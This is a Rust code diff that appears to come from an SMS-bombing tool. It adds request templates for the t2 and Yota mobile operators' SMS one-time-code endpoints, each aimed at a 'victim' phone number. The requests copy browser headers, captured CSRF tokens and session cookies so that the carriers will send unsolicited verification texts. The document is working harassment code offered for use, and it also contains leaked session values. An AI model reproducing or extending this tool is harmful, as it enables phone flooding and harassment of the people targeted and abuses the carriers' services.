@@ -63,7 +63,9 @@ pub struct Victim {
 ///
 ///     services.push(service);
 /// }
-pub async fn construct_services_list(victim: Victim) -> Vec<Service> {
+
+/// List of SMS services and services messages
+pub fn construct_services_list(victim: Victim) -> Vec<Service> {
     let mut services = Vec::new();
 
     match victim.phone.country {
@@ -265,6 +267,179 @@ pub async fn construct_services_list(victim: Victim) -> Vec<Service> {
                 service.body = json!({
                     "login": phone.phone,
                     "captchaReady": true
+                });
+
+                services.push(service);
+            }
+            // t2
+            {
+                let mut service = Service {
+                    name: "t2".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: format!(
+                        "https://msk.t2.ru/api/validation/number/{}",
+                        victim.phone.clone().phone
+                    )
+                        .to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"msk.t2.ru"#.parse().unwrap());
+                service.headers.insert(
+                    "User-Agent",
+                    r#"Mozilla/5.0 (X11; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/plain, */*"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Tele2-User-Agent", r#"web"#.parse().unwrap());
+                service.headers.insert(
+                    "X-Request-Id",
+                    r#"XmYFkByEbroR4guSn6PilcMWIv0H29JfxVeOq5Nh"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "X-User-Local-Time",
+                    r#"2024-11-20T10:27:32.636+0300"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("X-Requested-With", r#"XMLHttpRequest"#.parse().unwrap());
+                service.headers.insert("X-csrftoken", r#"18099c70fbbe8419ed642e005ebbe2a8a5028e9a66157b6b77d07bc1e4ff1f7eb42c82fb8815422e"#.parse().unwrap());
+                service.headers.insert(
+                    "X-Ajax-Token",
+                    r#"3f233460cff09905b0c79b19b3742039389db9c4d212080fe325ea418906dd64"#
+                        .parse()
+                        .unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://msk.t2.ru"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service.headers.insert(
+                    "Referer",
+                    r#"https://msk.t2.ru/?utm_referrer=https%3A%2F%2Fwww.google.com%2F"#
+                        .parse()
+                        .unwrap(),
+                );
+                service.headers.insert("Cookie", r#"language=ru-RU; ngenix_jscv_ce4643=visitor_id_af50ddc3=a01ae2675631621c20a25e8511a0b695&bot_profile_check=true&cookie_signature=NTQlG2PQMWa7aT7mFK%2BwQuC2v8o%3D&session_id_e0227498=05643bc3fde5620f367cada743577d35&domain=t2.ru&cookie_expires=1732173932; session-cookie=18099c70d953adf0ee56e9d4b4819f5ba45c4e7cf9a65ff4bc17ff4f5a1748a5e6bbbe5bb9af70adb6d578291864ef45; auth_state=NOT_AUTH; kc_config={%22realm%22:%22tele2-b2c%22%2C%22clientId%22:%22digital-suite-web-app%22%2C%22url%22:%22%22%2C%22updateTimeBeforeExpiration%22:60%2C%22defaultRefreshInterval%22:60%2C%22requestSetTokenTimeout%22:15%2C%22requestSetTokenRetry%22:2%2C%22requestSetTokenRetryDelay%22:2%2C%22requestUpdateTokenTimeout%22:10%2C%22requestUpdateTokenRetry%22:8%2C%22requestUpdateTokenRetryDelay%22:2%2C%22cookieDomain%22:%22.t2.ru%22%2C%22isActive%22:true%2C%22smsCodeLength%22:6%2C%22migration%22:true%2C%22skylinkCookieDomain%22:%22.skylink.ru%22}; csrf-token-name=csrftoken; csrf-token-value=18099c86a1da64cec1cf233d00ce099525a6465d3f55dded080bedb230855f6a7e445bacbb1efbf3; user-separator=part6; JSESSIONID=d9JIdoSN45BQcUrmDNkjqmZAmHly_iQsPksb-N72HRqTne-S15IE!1153775884"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-origin"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"msk.t2.ru"#.parse().unwrap());
+
+                service.body = json!({
+                    "sender": "Tele2"
+                });
+
+                services.push(service);
+            }
+            // Yota
+            {
+                let mut service = Service {
+                    name: "Yota".to_string(),
+                    service_type: ServiceType::Sms,
+                    method: Method::POST,
+                    url: "https://mapi.yota.ru/general/otp/auth/generate".to_string(),
+                    headers: HeaderMap::new(),
+                    body_type: BodyType::JSON,
+                    body: Default::default(),
+                };
+
+                service
+                    .headers
+                    .insert("Host", r#"mapi.yota.ru"#.parse().unwrap());
+                service.headers.insert("User-Agent", r#"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0"#.parse().unwrap());
+                service.headers.insert(
+                    "Accept",
+                    r#"application/json, text/plain, */*"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Language",
+                    r#"ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3"#.parse().unwrap(),
+                );
+                service.headers.insert(
+                    "Accept-Encoding",
+                    r#"gzip, deflate, br, zstd"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Content-Type", r#"application/json"#.parse().unwrap());
+                service.headers.insert("platform", r#"4"#.parse().unwrap());
+                service.headers.insert("build", r#"1.0"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("mobile-brand", r#"YOTA-001"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("osVersion", r#"firefox-132"#.parse().unwrap());
+                service.headers.insert(
+                    "X-TransactionId",
+                    r#"b9cf45af-fa99-444e-9fc5-f5c33a072b07"#.parse().unwrap(),
+                );
+                service
+                    .headers
+                    .insert("Origin", r#"https://web.yota.ru"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Connection", r#"keep-alive"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Referer", r#"https://web.yota.ru/"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Dest", r#"empty"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Mode", r#"cors"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("Sec-Fetch-Site", r#"same-site"#.parse().unwrap());
+                service.headers.insert("DNT", r#"1"#.parse().unwrap());
+                service.headers.insert("Sec-GPC", r#"1"#.parse().unwrap());
+                service
+                    .headers
+                    .insert("host", r#"mapi.yota.ru"#.parse().unwrap());
+
+                let phone = victim.phone.clone();
+                service.body = json!({
+                    "credentials": {
+                        "operationId": "iOS_mAPP_Auth_eSim",
+                        "msisdn": phone.phone
+                    },
+                    "channel": "SMS"
                 });
 
                 services.push(service);
